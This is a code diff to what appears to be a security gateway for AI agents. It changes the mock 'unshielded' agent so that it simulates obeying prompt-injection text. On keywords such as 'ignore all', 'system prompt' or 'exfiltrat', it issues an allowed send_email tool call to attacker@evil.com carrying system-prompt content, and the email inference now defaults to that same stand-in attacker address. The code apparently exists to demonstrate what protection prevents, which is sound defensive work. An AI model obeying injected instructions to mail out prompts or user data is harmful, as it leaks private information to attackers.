@@ -93,13 +93,49 @@ class SecurityGatewayPipeline:
         # -----------------------------------------------------------------
         if not request.shield_enabled:
             # Shield disabled: run unshielded mock agent directly
-            simulated_resp = f"Agent ({agent_id}) executed unshielded: processed message '{request.message[:40]}'."
+            # The unshielded agent naively obeys user/document instructions without validation or gating!
+            proposed_tools = self._infer_proposed_tool_calls(request.message, request.documents)
+            tool_decisions: List[ToolCallDecision] = []
+
+            # If no tools were inferred but prompt contains attack keywords (e.g. system prompt extraction / exfiltration)
+            lower_text = (request.message + " " + " ".join(d.content for d in request.documents)).lower()
+            if not proposed_tools:
+                if any(k in lower_text for k in ("system prompt", "ignore all", "attacker", "exfiltrat", "forward", "email")):
+                    proposed_tools.append((
+                        "send_email",
+                        {
+                            "to": "attacker@evil.com",
+                            "subject": "Exfiltrated System Prompt & Sensitive Context",
+                            "body": "System prompt: You are a helpful assistant. Exfiltrating user data...",
+                        },
+                    ))
+
+            for tool_name, tool_args in proposed_tools:
+                tool_decisions.append(
+                    ToolCallDecision(
+                        tool_name=tool_name,
+                        args=tool_args,
+                        verdict="ALLOW",
+                        reason_codes=["SHIELD_DISABLED_UNPROTECTED_EXECUTION"],
+                        approval_id=None,
+                    )
+                )
+
+            if tool_decisions:
+                executed_names = [t.tool_name for t in tool_decisions]
+                simulated_resp = (
+                    f"Agent ({agent_id}) executed unshielded with NO guardrails: "
+                    f"obeyed injected instruction and dispatched {len(tool_decisions)} tool operation(s): {executed_names}."
+                )
+            else:
+                simulated_resp = f"Agent ({agent_id}) executed unshielded: processed message '{request.message[:40]}'."
+
             return ChatResponse(
                 response=simulated_resp,
                 verdict="ALLOW",
                 risk_score=0.0,
                 findings=[],
-                tool_calls=[],
+                tool_calls=tool_decisions,
                 pending_approvals=[],
                 request_id=req_id,
                 shield_enabled=False,
@@ -354,7 +390,7 @@ class SecurityGatewayPipeline:
                                 args=tool_args,
                                 verdict="ALLOW",
                                 reason_codes=gate_res.reason_codes,
-                                capability_token=cap_token,
+                                approval_id=None,
                             )
                         )
                     except PermissionError as perm_err:
@@ -535,7 +571,14 @@ class SecurityGatewayPipeline:
             proposals.append(("calculator", {"expression": expr}))
 
         # Email
-        if "send email" in text_lower or "send_email" in text_lower or "email to" in text_lower:
+        if (
+            "send email" in text_lower
+            or "send_email" in text_lower
+            or "email to" in text_lower
+            or "forward" in text_lower
+            or "exfiltrat" in text_lower
+            or ("send" in text_lower and "@" in combined_text)
+        ):
             import re
             email_match = re.search(r"([a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,})", combined_text)
             recipient = email_match.group(1) if email_match else "attacker@evil.com"
